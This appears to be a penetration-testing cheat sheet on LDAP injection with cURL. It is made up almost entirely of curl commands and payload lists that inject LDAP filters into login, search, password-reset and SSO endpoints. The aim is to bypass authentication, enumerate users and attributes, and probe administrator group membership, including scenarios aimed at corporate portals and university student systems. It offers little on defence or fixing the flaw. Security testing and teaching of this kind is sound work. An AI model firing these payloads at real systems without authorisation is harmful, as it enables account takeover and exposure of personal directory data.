### ðŸ” LDAP Injection Testing with cURL

**LDAP Injection** is an attack that exploits web applications using LDAP (Lightweight Directory Access Protocol) for authentication or directory services. Attackers inject malicious LDAP filters to bypass authentication, access unauthorized data, or manipulate directory entries. **cURL** is an effective tool for testing LDAP injection vulnerabilities through web interfaces that communicate with LDAP backends.

  * **LDAP Special Characters:** *, (, ), &, |, !, =, ~=, >=, <=
  * **Attack Vectors:** Authentication forms, search functions, user lookup, password reset
  * **Impact:** Authentication bypass, information disclosure, data tampering, privilege escalation
  * **Common Targets:** Login pages, employee directories, user management systems
  * **Why Test with cURL:** Allows precise control over HTTP requests to craft malicious LDAP filter injections and analyze responses for vulnerabilities.

-----

### ðŸ“ Basic LDAP Injection Tests

Understanding how to test for LDAP injection using cURL.

  * **Basic Wildcard Injection**

    ```bash
    curl -X POST https://vulnerable-app.com/login \
      -d "username=*&password=*"
    ```

    **When to use:** Initial test to check if wildcard characters are processed.
    **Expected vulnerability:** Returns valid response with invalid credentials.

  * **Filter Termination Attack**

    ```bash
    curl -X POST https://vulnerable-app.com/login \
      -d "username=*)(&)&password=anything"
    ```

    **When to use:** Testing if application properly sanitizes parentheses.
    **Mechanism:** Closes original filter and adds always-true condition.

  * **OR Operator Injection**

    ```bash
    curl -X POST https://vulnerable-app.com/login \
      -d "username=*)(|(&)&password=test"
    ```

    **When to use:** Testing logical operator injection vulnerabilities.
    **Impact:** Could bypass authentication checks.

-----

### ðŸ”„ LDAP Injection Techniques with cURL

Different LDAP injection methods and how to test them with cURL.

  * **Authentication Bypass - Username Field**

    ```bash
    curl -X POST https://vulnerable-app.com/login \
      -d "username=admin*)(&(objectClass=user)&password=anything"
    ```

    **When to use:** Attempting to bypass login with admin privileges.
    **Logic:** Matches any admin user with wildcard and adds filter.

  * **Authentication Bypass - Password Field**

    ```bash
    curl -X POST https://vulnerable-app.com/login \
      -d "username=regularuser&password=*)(objectClass=*)"
    ```

    **When to use:** Testing if password field is vulnerable to injection.
    **Note:** Some applications pass password directly to LDAP filter.

  * **Information Disclosure - Search Function**

    ```bash
    curl -X GET "https://vulnerable-app.com/search?query=*)(objectClass=*"
    ```

    **When to use:** Testing search functionality for data leakage.
    **Risk:** Could expose all directory entries.

  * **Attribute Enumeration Attack**

    ```bash
    curl -X POST https://vulnerable-app.com/search \
      -d "query=*)(|(cn=*)(sn=*)(mail=*)(telephoneNumber=*)"
    ```

    **When to use:** Discovering which attributes are available in directory.
    **Method:** Uses OR operator to test multiple attributes.

  * **Blind LDAP Injection - Boolean Based**

    ```bash
    curl -X POST https://vulnerable-app.com/login \
      -d "username=admin)(&(objectClass=user)(department=IT))&password=test"
    ```

    ```bash
    curl -X POST https://vulnerable-app.com/login \
      -d "username=admin)(&(objectClass=user)(department=HR))&password=test"
    ```

    **When to use:** Testing for blind injection by observing response differences.
    **Technique:** Different responses indicate filter evaluation.

-----

### âš™ï¸ Advanced LDAP Injection Options

Advanced testing techniques and special cases for LDAP injection.

  * **Null Byte Injection**

    ```bash
    curl -X POST https://vulnerable-app.com/login \
      -d "username=admin%00*)(&)&password=test"
    ```

    **When to use:** Testing if application terminates strings at null bytes.
    **Effect:** May cause LDAP filter to ignore characters after null byte.

  * **URL Encoded Payloads**

    ```bash
    curl -X POST https://vulnerable-app.com/login \
      -d "username=%2A%29%28%26&password=test"
    ```

    **When to use:** Bypassing basic input validation that blocks special characters.
    **Encoded value:** `*)(&` becomes `%2A%29%28%26`

  * **Nested Parentheses Attack**

    ```bash
    curl -X POST https://vulnerable-app.com/login \
      -d "username=*))(&(cn=admin&password=test"
    ```

    **When to use:** Testing complex filter manipulation.
    **Structure:** Closes multiple parentheses levels.

  * **Comment Injection**

    ```bash
    curl -X POST https://vulnerable-app.com/login \
      -d "username=admin*)(&))/*&password=test"
    ```

    **When to use:** Testing LDAP implementations that support comments.
    **Note:** Not all LDAP servers support comments in filters.

  * **Multi-Parameter Injection**

    ```bash
    curl -X POST https://vulnerable-app.com/search \
      -d "name=*)(cn=*&department=*)(objectClass=*&location=*"
    ```

    **When to use:** When multiple parameters are used in LDAP query construction.
    **Risk:** Each vulnerable parameter expands the attack surface.

-----

### ðŸ› ï¸ Practical LDAP Injection Examples

Real-world scenarios and use cases for LDAP injection testing.

  * **Complete Authentication Bypass Test Suite**

    ```bash
    # Test 1: Basic wildcard
    curl -X POST https://target-app.com/login -d "username=*&password=*"
    
    # Test 2: Filter termination
    curl -X POST https://target-app.com/login -d "username=*)(&)&password=test"
    
    # Test 3: OR operator
    curl -X POST https://target-app.com/login -d "username=*)(|(&)&password=test"
    
    # Test 4: ObjectClass disclosure
    curl -X POST https://target-app.com/login -d "username=*)(objectClass=*&password=test"
    
    # Test 5: Specific attribute
    curl -X POST https://target-app.com/login -d "username=*)(uid=*&password=test"
    ```

    **When to use:** Comprehensive authentication form testing.
    **Workflow:** Progress from simple to complex injection attempts.

  * **User Directory Information Extraction**

    ```bash
    # Get all users
    curl "https://target-app.com/users?filter=*)(objectClass=user"
    
    # Get all persons
    curl "https://target-app.com/users?filter=*)(objectClass=person"
    
    # Get users with specific attribute
    curl "https://target-app.com/users?filter=*)(mail=*"
    
    # Get users in specific department
    curl "https://target-app.com/users?filter=*)(department=IT"
    ```

    **When to use:** Testing search and directory listing functionality.
    **Goal:** Extract unauthorized directory information.

  * **Password Policy Discovery**

    ```bash
    # Test password policy attributes
    curl "https://target-app.com/policy?user=*)(pwdMinLength=*"
    curl "https://target-app.com/policy?user=*)(pwdMaxAge=*"
    curl "https://target-app.com/policy?user=*)(lockoutThreshold=*"
    ```

    **When to use:** When password management interfaces exist.
    **Information:** Reveals security policy configuration.

  * **Group Membership Testing**

    ```bash
    # Test for group membership checks
    curl -X POST https://target-app.com/access \
      -d "user=*)(memberOf=cn=Administrators,ou=Groups,dc=example,dc=com"
    
    # Test wildcard group matching
    curl -X POST https://target-app.com/access \
      -d "user=*)(memberOf=cn=Admin*"
    ```

    **When to use:** Testing authorization based on group membership.
    **Impact:** Could grant unauthorized access to privileged functions.

-----

### ðŸ“‹ LDAP Injection Dictionary Reference

Comprehensive payload reference for manual testing.

  * **Authentication Bypass Payloads**

    ```
    *)(&
    *)(|(&
    *)(|(objectClass=*
    *)(uid=*)
    *)(cn=*)
    *)(|(cn=*
    *))(|(cn=*
    admin*)
    *)(|(password=*
    *)(|(userPassword=*
    *)(|(sn=*
    ```

  * **Information Disclosure Payloads**

    ```
    *)(objectClass=*
    *)(objectClass=user)
    *)(objectClass=person)
    *)(objectClass=organizationalPerson)
    *)(objectClass=inetOrgPerson)
    *)(objectClass=*)(userPassword=*
    *)(objectClass=*)(password=*
    *)(|(cn=*)(sn=*)(givenName=*)
    *)(|(mail=*)(telephoneNumber=*)
    *)(|(uid=*)(employeeNumber=*)
    *)(|(department=*)(title=*)
    ```

  * **Advanced Injection Techniques**

    ```
    *))(&(cn=*
    *))(|(cn=*
    *))(|(&(cn=*
    *))(|(objectClass=*
    *)(&(objectClass=user)(|(1=0)(cn=*
    *)(&(objectClass=user)(|(1=1)(cn=*
    *)(objectClass=*)(|(cn=admin)(cn=test)
    ```

  * **Field-Specific Payloads**

    ```
    *)(mail=*
    user@domain*)(&
    *)(|(mail=*
    *))(|(mail=*
    *)(mail=user@example.com
    *)(uidNumber=*
    0)(uidNumber=0
    *)(|(uidNumber=*
    999999)(uidNumber=999999
    *)(gidNumber=*
    ```

-----

### ðŸ”’ LDAP Injection Testing Workflow

Systematic approach to LDAP injection testing with cURL.

  * **Initial Reconnaissance**

    ```bash
    # Test for basic LDAP interaction
    curl -v https://target-app.com/login
    curl -v https://target-app.com/search
    curl -v https://target-app.com/users
    ```

    **When to use:** Identifying endpoints that interact with LDAP.
    **Look for:** LDAP error messages, directory structure hints.

  * **Manual Testing Sequence**

    ```bash
    # Step 1: Test basic wildcard
    curl -X POST [TARGET]/login -d "username=*&password=*"
    
    # Step 2: Test filter termination
    curl -X POST [TARGET]/login -d "username=*)(&)&password=test"
    
    # Step 3: Test OR injection
    curl -X POST [TARGET]/login -d "username=*)(|(&)&password=test"
    
    # Step 4: Test objectClass disclosure
    curl -X POST [TARGET]/login -d "username=*)(objectClass=*&password=test"
    
    # Step 5: Test uid/cn injection
    curl -X POST [TARGET]/login -d "username=*)(uid=*&password=test"
    
    # Step 6: Test password field injection
    curl -X POST [TARGET]/login -d "username=admin&password=*)(objectClass=*"
    ```

    **When to use:** Step-by-step vulnerability discovery.
    **Progression:** From simple to complex injection techniques.

  * **Payload Category Testing**

    ```bash
    # Category 1: Simple Bypass
    curl -X POST [TARGET]/login -d "username=*&password=test"
    curl -X POST [TARGET]/login -d "username=*)&password=test"
    
    # Category 2: Logical Operators
    curl -X POST [TARGET]/login -d "username=*)(&password=test"
    curl -X POST [TARGET]/login -d "username=*)(|&password=test"
    
    # Category 3: Attribute Injection
    curl -X POST [TARGET]/login -d "username=*)(cn=*&password=test"
    curl -X POST [TARGET]/login -d "username=*)(uid=*&password=test"
    
    # Category 4: ObjectClass Injection
    curl -X POST [TARGET]/login -d "username=*)(objectClass=*&password=test"
    curl -X POST [TARGET]/login -d "username=*)(objectClass=user&password=test"
    
    # Category 5: Complex Combinations
    curl -X POST [TARGET]/login -d "username=*))(|(cn=*&password=test"
    curl -X POST [TARGET]/login -d "username=*)(|(cn=*)(sn=*&password=test"
    
    # Category 6: Null Byte Attacks
    curl -X POST [TARGET]/login -d "username=*%00&password=test"
    curl -X POST [TARGET]/login -d "username=*%00)(&password=test"
    
    # Category 7: Encoding Variations
    curl -X POST [TARGET]/login -d "username=%2A%29%28%26&password=test"
    curl -X POST [TARGET]/login -d "username=%2A%29%7C%28&password=test"
    ```

    **When to use:** Testing different payload categories systematically.
    **Organization:** Group similar attack techniques together.

  * **Scenario-Based Testing**

    ```bash
    # Scenario 1: Login Form
    curl -X POST [TARGET]/login -d "username=*)(&password=anything"
    curl -X POST [TARGET]/login -d "username=admin&password=*)(|(&"
    
    # Scenario 2: Search Function
    curl -X GET "[TARGET]/search?query=*)(cn=*"
    curl -X GET "[TARGET]/search?query=*)(|(cn=*)(sn=*"
    
    # Scenario 3: User Lookup
    curl -X GET "[TARGET]/user/*)(uid=*"
    curl -X GET "[TARGET]/user/*)(mail=*"
    
    # Scenario 4: Password Reset
    curl -X POST [TARGET]/reset -d "email=*)(mail=*@domain.com"
    curl -X POST [TARGET]/reset -d "username=*)(userPassword=*"
    ```

    **When to use:** Testing specific application functionalities.
    **Context:** Different features may have different injection points.

-----

### ðŸŒ Real-World LDAP Injection Scenarios

Practical applications of LDAP injection testing in various environments.

  * **Enterprise Portal Testing**

    ```bash
    # Employee directory search
    curl "https://portal.company.com/search?name=*)(objectClass=employee"
    
    # Internal authentication
    curl -X POST https://portal.company.com/auth \
      -d "employeeId=*)(&)&pin=1234"
    
    # Department filtering
    curl "https://portal.company.com/dept?code=*)(division=*"
    ```

    **Why it's used:** Corporate environments often use LDAP for employee management.
    **Impact:** Could expose sensitive employee information.

  * **Web Application Single Sign-On (SSO)**

    ```bash
    # SSO authentication test
    curl -X POST https://app.company.com/sso \
      -H "Content-Type: application/json" \
      -d '{"username": "*)(&)", "domain": "company"}'
    
    # LDAP group validation
    curl -X POST https://app.company.com/check-access \
      -d "user=*)(memberOf=CN=AppUsers,OU=Groups,DC=company,DC=com"
    ```

    **Why it's used:** Many SSO implementations rely on LDAP.
    **Risk:** Bypassing SSO could grant access to multiple applications.

  * **University Systems Testing**

    ```bash
    # Student directory
    curl "https://university.edu/students?id=*)(studentId=*"
    
    # Faculty authentication
    curl -X POST https://university.edu/faculty/login \
      -d "username=prof*)(&(title=Professor)&password=test"
    
    # Course enrollment check
    curl "https://university.edu/enroll?student=*)(enrolledCourses=*"
    ```

    **Why it's used:** Educational institutions commonly use LDAP.
    **Data at risk:** Student records, grades, personal information.

-----

### ðŸ“Š LDAP Injection Payload Quick Reference

| Payload Category | Example Payloads | cURL Command Example |
| :--- | :--- | :--- |
| **Simple Bypass** | `*`, `*)`, `*)(`, `*))(` | `curl -d "user=*" [TARGET]` |
| **Logical Operators** | `*)(&`, `*)(|`, `*)(!(`, `*)(&(` | `curl -d "user=*)(&" [TARGET]` |
| **Attribute Injection** | `*)(cn=*`, `*)(uid=*`, `*)(mail=*` | `curl -d "user=*)(cn=*" [TARGET]` |
| **ObjectClass** | `*)(objectClass=*`, `*)(objectClass=user` | `curl -d "user=*)(objectClass=*" [TARGET]` |
| **Complex Combinations** | `*))(|(cn=*`, `*)(|(cn=*)(sn=*` | `curl -d "user=*))(|(cn=*" [TARGET]` |
| **Null Byte** | `*%00`, `*%00)(&`, `admin%00*` | `curl -d "user=*%00" [TARGET]` |
| **URL Encoded** | `%2A%29%28%26`, `%2A%29%7C%28`, `admin%2A` | `curl -d "user=%2A%29%28%26" [TARGET]` |
| **Advanced Patterns** | `*)(&(objectClass=user)(cn=a*)`, `*)(invalidAttribute=*` | `curl -d "user=*)(&(objectClass=user)(cn=a*)" [TARGET]` |

-----

**Made with love by VIsh0k**